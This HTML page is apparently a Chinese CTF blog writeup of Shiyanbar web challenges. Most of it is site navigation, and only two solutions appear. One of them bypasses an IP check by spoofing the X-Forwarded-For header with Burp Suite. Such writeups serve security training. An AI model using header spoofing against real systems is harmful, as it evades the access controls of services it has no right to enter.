<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>实验吧web—writeup | Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全</title>
  <meta name="keywords" content=" WP ">
  <meta name="description" content="实验吧web—writeup | Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
<meta property="og:type" content="website">
<meta property="og:title" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
<meta property="og:url" content="http://Bigbroke.com/404.html">
<meta property="og:site_name" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
<meta property="og:description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2017-10-07T10:21:52.994Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
<meta name="twitter:description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">


<link rel="icon" href="/img/head.jpg">

<link rel="stylesheet" href="/css/style.css">

<link rel="stylesheet" href="/css/hl_theme/sublime.css">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<link href="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/photoswipe/4.1.2/default-skin/default-skin.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js"></script>
<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>

</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="true">
</div>
<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/head.jpg" />
</a>
<div class="author">
    <span>Bigbroke</span>
</div>

<div class="icon">
    
    <a class="rss" title="rss" href="/atom.xml" target="_blank"></a>
    
    
    <a class="github" title="github" href="https://github.com/bigbroke" target="_blank"></a>
    
    
    
    
    
    <a class="instagram" title="instagram" href="https://www.instagram.com/xxx/" target="_blank"></a>
    
    
    
    <a class="weibo" title="weibo" href="http://weibo.com/u/xxx/" target="_blank"></a>
    
    
    <a class="email" title="email" href="mailto:72382781@qq.com"></a>
    
</div>



<ul>
    <li class="all active">全部文章</li>
    
    <li data-rel="思考"> 思考 </li>
    
    <li data-rel="Language"> Language </li>
    
    <li data-rel="CTF"> CTF </li>
    
    <li data-rel="AiSecurity"> AiSecurity </li>
    
    <li data-rel="代码审计"> 代码审计 </li>
    
    <li data-rel="Kali"> Kali </li>
    
    <li data-rel="工具"> 工具 </li>
    
    <li data-rel="WebSecurity"> WebSecurity </li>
    
    <li data-rel="读书摘要"> 读书摘要 </li>
    
    <li data-rel="渗透测试"> 渗透测试 </li>
    
    <li data-rel="内网"> 内网 </li>
    
    <li data-rel="源码阅读"> 源码阅读 </li>
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div><a style="border-right: 1px solid #fff; width: 49%"  class="about site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="56">
<input type="hidden" id="yelog_site_word_count" value="115.2k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>
    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="/https/www.baidu.com">faBaidu</a></li>
            
            <li><a target="_blank" href="/https/www.google.com">fbGoogle</a></li>
            
            <li><a target="_blank" href="http://www.cnblogs.com/iamstudy/">I3m0n</a></li>
            
            <li><a target="_blank" href="http://ph0rse.me/">Ph0rse</a></li>
            
            <li><a target="_blank" href="http://03i0.com/">Sn00py</a></li>
            
            <li><a target="_blank" href="http://jlkl.github.io/">Str3am</a></li>
            
            <li><a target="_blank" href="http://marblue.me/">Marbule</a></li>
            
            <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
            
            <li><a target="_blank" href="http://zo1ro.tk/">ZO1RO</a></li>
            
            <li><a target="_blank" href="https://blog.ruozhi.xyz/">ru0zhI</a></li>
            
            <li><a target="_blank" href="http://wulidecade.cn/">Decade</a></li>
            
            <li><a target="_blank" href="https://www.cnblogs.com/sn1per/">Sn1per</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode==13){return false;}">
        <input class="search" type="text" placeholder="以 in: 开头进行全文搜索" autocomplete="off"id="local-search-input" >
        <i class="cross"></i>
        <span>
        <label for="tagswitch">Tags:</label>
        <input id="tagswitch" type="checkbox">
    </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">思考</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">life</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">正则</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">WP</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color1">first-blog</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">ctf</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">代码审计</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">sqlilabs</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color2">sqlmap</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">cve</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">VIM</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">Nmap</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">密码学</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">hexo</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color1">Nikto</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">TCPDUMP</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">QWASP_ZAP</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color2">NETCAT</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color2">docker</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">Skipfish</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">Vega</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">复现</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">文件包含</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">读书摘要</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">信息收集</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color1">Web漏洞</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">内网</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">CTF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">文件上传</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">渗透</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">web</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color4">黑客攻防web安全实战详解</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">入侵</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">Dvwa</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        <a  class="读书摘要 "
           href="/archis/a7cdea15/"
           data-tag="读书摘要"
           data-author="" >
            <span class="post-title" title="《互联网企业安全高级指南》读书笔记">《互联网企业安全高级指南》读书笔记</span>
            <span class="post-date" title="2020-03-04 18:17:30">2020/03/04</span>
        </a>
        
        <a  class="源码阅读 "
           href="/archis/f4173bf8/"
           data-tag="ctf"
           data-author="" >
            <span class="post-title" title="Read-Sitadel-Source">Read-Sitadel-Source</span>
            <span class="post-date" title="2019-03-15 00:00:08">2019/03/15</span>
        </a>
        
        <a  class="AiSecurity "
           href="/archis/eed6fa1/"
           data-tag="ctf"
           data-author="" >
            <span class="post-title" title="AI-Security-Learning">AI-Security-Learning</span>
            <span class="post-date" title="2019-02-17 21:15:30">2019/02/17</span>
        </a>
        
        <a  class="思考 "
           href="/archis/f7c9beed/"
           data-tag="life"
           data-author="" >
            <span class="post-title" title="2018反思总结">2018反思总结</span>
            <span class="post-date" title="2018-12-31 01:14:45">2018/12/31</span>
        </a>
        
        <a  class="CTF "
           href="/archis/49b464e6/"
           data-tag="ctf"
           data-author="" >
            <span class="post-title" title="初探线下CTF-AWD模式">初探线下CTF-AWD模式</span>
            <span class="post-date" title="2018-12-02 17:13:50">2018/12/02</span>
        </a>
        
        <a  class="内网 "
           href="/archis/7db24e65/"
           data-tag="内网"
           data-author="" >
            <span class="post-title" title="内网渗透基础知识">内网渗透基础知识</span>
            <span class="post-date" title="2018-12-02 17:07:15">2018/12/02</span>
        </a>
        
        <a  class="CTF "
           href="/archis/6bd5dfde/"
           data-tag="ctf"
           data-author="" >
            <span class="post-title" title="第一届安洵杯writeup">第一届安洵杯writeup</span>
            <span class="post-date" title="2018-11-26 21:23:57">2018/11/26</span>
        </a>
        
        <a  class="CTF "
           href="/archis/4341f801/"
           data-tag="ctf"
           data-author="" >
            <span class="post-title" title="HCTF2018-web writeup">HCTF2018-web writeup</span>
            <span class="post-date" title="2018-11-13 13:26:20">2018/11/13</span>
        </a>
        
        <a  class="工具 "
           href="/archis/47a94ec3/"
           data-tag="docker"
           data-author="" >
            <span class="post-title" title="docker复现ctf&amp;dockerfile编写ctf环境">docker复现ctf&amp;dockerfile编写ctf环境</span>
            <span class="post-date" title="2018-10-29 21:57:39">2018/10/29</span>
        </a>
        
        <a  class="代码审计 "
           href="/archis/441c37c9/"
           data-tag="代码审计"
           data-author="" >
            <span class="post-title" title="墨者学院审计类通关指南">墨者学院审计类通关指南</span>
            <span class="post-date" title="2018-10-28 22:02:08">2018/10/28</span>
        </a>
        
        <a  class="WebSecurity "
           href="/archis/767136e1/"
           data-tag="复现"
           data-author="" >
            <span class="post-title" title="phpMyAdmin 4.8.x 本地文件包含">phpMyAdmin 4.8.x 本地文件包含</span>
            <span class="post-date" title="2018-10-27 12:19:37">2018/10/27</span>
        </a>
        
        <a  class="读书摘要 "
           href="/archis/924987ad/"
           data-tag="读书摘要"
           data-author="" >
            <span class="post-title" title="《Web安全攻防-渗透测试实战指南》读书笔记">《Web安全攻防-渗透测试实战指南》读书笔记</span>
            <span class="post-date" title="2018-10-26 22:05:27">2018/10/26</span>
        </a>
        
        <a  class="WebSecurity "
           href="/archis/b46a6d47/"
           data-tag="web"
           data-author="" >
            <span class="post-title" title="验证码相关安全问题">验证码相关安全问题</span>
            <span class="post-date" title="2018-10-23 23:05:15">2018/10/23</span>
        </a>
        
        <a  class="代码审计 "
           href="/archis/a5c61176/"
           data-tag="cve"
           data-author="" >
            <span class="post-title" title="Xss in MetInfo V6.1.2">Xss in MetInfo V6.1.2</span>
            <span class="post-date" title="2018-10-16 02:16:08">2018/10/16</span>
        </a>
        
        <a  class="CTF "
           href="/archis/173905c2/"
           data-tag="ctf"
           data-author="" >
            <span class="post-title" title="护网杯wp">护网杯wp</span>
            <span class="post-date" title="2018-10-13 23:53:02">2018/10/13</span>
        </a>
        
        <a  class="WebSecurity "
           href="/archis/95d370e7/"
           data-tag="Web漏洞"
           data-author="" >
            <span class="post-title" title="web漏洞挖掘之点击劫持漏洞">web漏洞挖掘之点击劫持漏洞</span>
            <span class="post-date" title="2018-10-11 14:13:02">2018/10/11</span>
        </a>
        
        <a  class="Language "
           href="/archis/7fe4b50e/"
           data-tag="正则"
           data-author="" >
            <span class="post-title" title="20个常用的正则表达式">20个常用的正则表达式</span>
            <span class="post-date" title="2018-10-09 16:29:34">2018/10/09</span>
        </a>
        
        <a  class="AiSecurity "
           href="/archis/d4eed376/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="机器学习概念">机器学习概念</span>
            <span class="post-date" title="2018-10-09 16:29:01">2018/10/09</span>
        </a>
        
        <a  class="内网 "
           href="/archis/17ef10d7/"
           data-tag="内网"
           data-author="" >
            <span class="post-title" title="浅谈内网渗透流程">浅谈内网渗透流程</span>
            <span class="post-date" title="2018-10-09 10:50:44">2018/10/09</span>
        </a>
        
        <a  class="CTF "
           href="/archis/18042369/"
           data-tag="CTF"
           data-author="" >
            <span class="post-title" title="安恒5月">安恒5月</span>
            <span class="post-date" title="2018-08-25 20:40:51">2018/08/25</span>
        </a>
        
        <a  class="CTF "
           href="/archis/b20debe2/"
           data-tag="CTF"
           data-author="" >
            <span class="post-title" title="安恒7月">安恒7月</span>
            <span class="post-date" title="2018-08-25 20:39:36">2018/08/25</span>
        </a>
        
        <a  class="代码审计 "
           href="/archis/8395d5c7/"
           data-tag="代码审计"
           data-author="" >
            <span class="post-title" title="墨者学院php代码审计1">墨者学院php代码审计1</span>
            <span class="post-date" title="2018-08-25 20:32:48">2018/08/25</span>
        </a>
        
        <a  class="代码审计 "
           href="/archis/d8be4236/"
           data-tag="代码审计"
           data-author="" >
            <span class="post-title" title="PHP字符串&#39;和“区别">PHP字符串&#39;和“区别</span>
            <span class="post-date" title="2018-08-25 20:22:01">2018/08/25</span>
        </a>
        
        <a  class="渗透测试 "
           href="/archis/35d3b1d4/"
           data-tag="渗透"
           data-author="" >
            <span class="post-title" title="渗透测试基础">渗透测试基础</span>
            <span class="post-date" title="2018-08-01 23:43:32">2018/08/01</span>
        </a>
        
        <a  class="思考 "
           href="/archis/80e1beed/"
           data-tag="思考"
           data-author="" >
            <span class="post-title" title="八月展望">八月展望</span>
            <span class="post-date" title="2018-08-01 23:41:26">2018/08/01</span>
        </a>
        
        <a  class="CTF "
           href="/archis/f4e3f3ec/"
           data-tag="WP"
           data-author="" >
            <span class="post-title" title="2018SCTF-wp">2018SCTF-wp</span>
            <span class="post-date" title="2018-06-20 22:40:40">2018/06/20</span>
        </a>
        
        <a  class="WebSecurity "
           href="/archis/2947d8f2/"
           data-tag="密码学"
           data-author="" >
            <span class="post-title" title="cbc字节翻转攻击">cbc字节翻转攻击</span>
            <span class="post-date" title="2018-06-01 00:47:50">2018/06/01</span>
        </a>
        
        <a  class="CTF "
           href="/archis/4e1d9865/"
           data-tag="WP"
           data-author="" >
            <span class="post-title" title="ISCC2018-writeup">ISCC2018-writeup</span>
            <span class="post-date" title="2018-05-28 00:54:05">2018/05/28</span>
        </a>
        
        <a  class="CTF "
           href="/archis/ceb4048b/"
           data-tag="WP"
           data-author="" >
            <span class="post-title" title="全国网络空间安全技术大赛2018三道wp">全国网络空间安全技术大赛2018三道wp</span>
            <span class="post-date" title="2018-05-15 19:04:17">2018/05/15</span>
        </a>
        
        <a  class="CTF "
           href="/archis/e36e397d/"
           data-tag="WP"
           data-author="" >
            <span class="post-title" title="bugku-misc">bugku-misc</span>
            <span class="post-date" title="2018-05-01 19:02:14">2018/05/01</span>
        </a>
        
        <a  class="Kali "
           href="/archis/40a439a4/"
           data-tag="Nmap"
           data-author="" >
            <span class="post-title" title="Nmap 使用技巧汇总">Nmap 使用技巧汇总</span>
            <span class="post-date" title="2018-04-23 22:07:46">2018/04/23</span>
        </a>
        
        <a  class="WebSecurity "
           href="/archis/844a29d4/"
           data-tag="文件包含"
           data-author="" >
            <span class="post-title" title="php文件包含漏洞">php文件包含漏洞</span>
            <span class="post-date" title="2018-04-23 21:39:49">2018/04/23</span>
        </a>
        
        <a  class="WebSecurity "
           href="/archis/ea42f6a6/"
           data-tag="文件上传"
           data-author="" >
            <span class="post-title" title="文件上传总结">文件上传总结</span>
            <span class="post-date" title="2018-04-23 21:39:03">2018/04/23</span>
        </a>
        
        <a  class="CTF "
           href="/archis/a7a61e20/"
           data-tag="WP"
           data-author="" >
            <span class="post-title" title="DDCTF三道小结">DDCTF三道小结</span>
            <span class="post-date" title="2018-04-23 21:35:39">2018/04/23</span>
        </a>
        
        <a  class="渗透测试 "
           href="/archis/1f382107/"
           data-tag="入侵"
           data-author="" >
            <span class="post-title" title="高级入侵">高级入侵</span>
            <span class="post-date" title="2018-04-23 21:33:14">2018/04/23</span>
        </a>
        
        <a  class="渗透测试 "
           href="/archis/312e3d12/"
           data-tag="信息收集"
           data-author="" >
            <span class="post-title" title="信息收集">信息收集</span>
            <span class="post-date" title="2018-04-02 16:15:51">2018/04/02</span>
        </a>
        
        <a  class="CTF "
           href="/archis/ced895c1/"
           data-tag="sqlilabs"
           data-author="" >
            <span class="post-title" title="sqli-labs less11-15">sqli-labs less11-15</span>
            <span class="post-date" title="2018-04-02 16:15:38">2018/04/02</span>
        </a>
        
        <a  class="CTF "
           href="/archis/9a0d7777/"
           data-tag="sqlilabs"
           data-author="" >
            <span class="post-title" title="sqli-labs  less7-10">sqli-labs  less7-10</span>
            <span class="post-date" title="2018-04-02 16:15:23">2018/04/02</span>
        </a>
        
        <a  class="CTF "
           href="/archis/4303333d/"
           data-tag="sqlilabs"
           data-author="" >
            <span class="post-title" title="sqli-labs5-6(盲注)">sqli-labs5-6(盲注)</span>
            <span class="post-date" title="2018-04-02 16:14:58">2018/04/02</span>
        </a>
        
        <a  class="CTF "
           href="/archis/239c6225/"
           data-tag="sqlilabs"
           data-author="" >
            <span class="post-title" title="Sqli-labs  1-4">Sqli-labs  1-4</span>
            <span class="post-date" title="2018-04-02 16:13:07">2018/04/02</span>
        </a>
        
        <a  class="CTF "
           href="/archis/79216fa/"
           data-tag="WP"
           data-author="" >
            <span class="post-title" title="实验吧web—writeup">实验吧web—writeup</span>
            <span class="post-date" title="2018-04-02 16:10:18">2018/04/02</span>
        </a>
        
        <a  class="CTF "
           href="/archis/2ccf6cb2/"
           data-tag="WP"
           data-author="" >
            <span class="post-title" title="第二届强网杯-部分wp">第二届强网杯-部分wp</span>
            <span class="post-date" title="2018-04-02 16:08:51">2018/04/02</span>
        </a>
        
        <a  class="读书摘要 "
           href="/archis/2ab3b8ea/"
           data-tag="黑客攻防web安全实战详解"
           data-author="" >
            <span class="post-title" title="黑客攻防web安全实战详解">黑客攻防web安全实战详解</span>
            <span class="post-date" title="2018-02-27 19:57:12">2018/02/27</span>
        </a>
        
        <a  class="Kali "
           href="/archis/b248361f/"
           data-tag="QWASP_ZAP"
           data-author="" >
            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-QWASP_ZAP">kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</span>
            <span class="post-date" title="2018-02-27 19:54:20">2018/02/27</span>
        </a>
        
        <a  class="Kali "
           href="/archis/136af25a/"
           data-tag="Vega"
           data-author="" >
            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Vega">kali渗透测试之Web渗透-扫描工具-Vega</span>
            <span class="post-date" title="2018-02-27 19:51:36">2018/02/27</span>
        </a>
        
        <a  class="Kali "
           href="/archis/497d64c3/"
           data-tag="Skipfish"
           data-author="" >
            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Skipfish">kali渗透测试之Web渗透-扫描工具-Skipfish</span>
            <span class="post-date" title="2018-02-27 19:49:37">2018/02/27</span>
        </a>
        
        <a  class="Kali "
           href="/archis/a04b3dd7/"
           data-tag="Nikto"
           data-author="" >
            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Nikto">kali渗透测试之Web渗透-扫描工具-Nikto</span>
            <span class="post-date" title="2018-02-27 19:47:03">2018/02/27</span>
        </a>
        
        <a  class="Kali "
           href="/archis/2b646ba1/"
           data-tag="TCPDUMP"
           data-author="" >
            <span class="post-title" title="kali渗透测试之Web渗透-工具-TCPDUMP">kali渗透测试之Web渗透-工具-TCPDUMP</span>
            <span class="post-date" title="2018-02-27 19:42:43">2018/02/27</span>
        </a>
        
        <a  class="Kali "
           href="/archis/32be69d6/"
           data-tag="NETCAT"
           data-author="" >
            <span class="post-title" title="kali渗透测试之Web渗透-工具-NETCAT">kali渗透测试之Web渗透-工具-NETCAT</span>
            <span class="post-date" title="2018-02-27 19:38:09">2018/02/27</span>
        </a>
        
        <a  class="工具 "
           href="/archis/2e6b5387/"
           data-tag="VIM"
           data-author="" >
            <span class="post-title" title="Vim简单入门笔记">Vim简单入门笔记</span>
            <span class="post-date" title="2017-12-15 19:07:45">2017/12/15</span>
        </a>
        
        <a  class="思考 "
           href="/archis/fb4597d6/"
           data-tag="思考"
           data-author="" >
            <span class="post-title" title="17-11反思与进取">17-11反思与进取</span>
            <span class="post-date" title="2017-11-22 17:10:55">2017/11/22</span>
        </a>
        
        <a  class="CTF "
           href="/archis/18acffef/"
           data-tag="Dvwa"
           data-author="" >
            <span class="post-title" title="DVWA笔记">DVWA笔记</span>
            <span class="post-date" title="2017-11-22 17:06:26">2017/11/22</span>
        </a>
        
        <a  class="思考 "
           href="/archis/undefined/"
           data-tag="hexo"
           data-author="" >
            <span class="post-title" title="hexo博客搭建">hexo博客搭建</span>
            <span class="post-date" title="2017-11-22 16:57:45">2017/11/22</span>
        </a>
        
        <a  class="Kali "
           href="/archis/18bbc00d/"
           data-tag="sqlmap"
           data-author="" >
            <span class="post-title" title="SQLMAP注入教程-11种常见SQLMAP使用方法详解">SQLMAP注入教程-11种常见SQLMAP使用方法详解</span>
            <span class="post-date" title="2017-11-21 04:27:10">2017/11/21</span>
        </a>
        
        <a  class="CTF "
           href="/archis/83955867/"
           data-tag="WP"
           data-author="" >
            <span class="post-title" title="第八届Geek部分web">第八届Geek部分web</span>
            <span class="post-date" title="2017-10-20 16:07:05">2017/10/20</span>
        </a>
        
        <a  class="思考 "
           href="/archis/e53fb0b9/"
           data-tag="first-blog"
           data-author="" >
            <span class="post-title" title="my-first-blog">my-first-blog</span>
            <span class="post-date" title="2017-09-27 16:56:58">2017/09/27</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-实验吧web—writeup" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">实验吧web—writeup</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            
            <a href="javascript:" data-rel="CTF">CTF</a>
            
        </span>
        
        
        <span class="tag">
            
            <a href="javascript:" class="color3">WP</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:17'>2018-04-02 16:10</time>
        
    </div>
    <div class="article-meta">
        
        <span>字数:6,763</span>
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="跳转至评论区">
            <a href="#comments">
                评论:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#实验吧web—writeup"><span class="toc-text">实验吧web—writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Forms"><span class="toc-text">Forms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#貌似有点难"><span class="toc-text">貌似有点难</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看起来有点难"><span class="toc-text">看起来有点难</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猫抓老鼠"><span class="toc-text">猫抓老鼠</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#头有点大"><span class="toc-text">头有点大</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这个看起来有点简单"><span class="toc-text">这个看起来有点简单!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP大法"><span class="toc-text">PHP大法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#what-a-fuck-这是什么鬼东西"><span class="toc-text">what a fuck!这是什么鬼东西?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序逻辑问题"><span class="toc-text">程序逻辑问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSCTF-web200"><span class="toc-text">NSCTF web200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传绕过"><span class="toc-text">上传绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FALSE"><span class="toc-text">FALSE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Guess-Next"><span class="toc-text">Guess Next</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Once-More"><span class="toc-text">Once More</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#忘记密码了"><span class="toc-text">忘记密码了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#天网管理系统"><span class="toc-text">天网管理系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forms-1"><span class="toc-text">Forms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#拐弯抹角"><span class="toc-text">拐弯抹角</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#让我进去"><span class="toc-text">让我进去</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的sql注入"><span class="toc-text">简单的sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的sql注入之3"><span class="toc-text">简单的sql注入之3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#因缺思汀的绕过"><span class="toc-text">因缺思汀的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#who-are-you"><span class="toc-text">who are you?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#登录一下好吗？？"><span class="toc-text">登录一下好吗？？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#你真的会PHP吗？"><span class="toc-text">*你真的会PHP吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后台登录"><span class="toc-text">后台登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的登录题"><span class="toc-text">简单的登录题</span></a></li></ol></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="实验吧web—writeup"><a href="#实验吧web—writeup" class="headerlink" title="实验吧web—writeup"></a>实验吧web—writeup</h1><p>[toc]</p>
<h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p><a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/main.php</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181631_235.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181631_176.png" alt=""></p>
<h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>查看修改或添加HTTP请求头响应头<br>改X-Forwarded-For: 1.1.1.1<br><a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="external">http://ctf5.shiyanbar.com/phpaudit/</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181634_594.png" alt=""><br>burp抓包改改X-Forwarded-For: 1.1.1.1<br> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181643_54.png" alt=""></p>
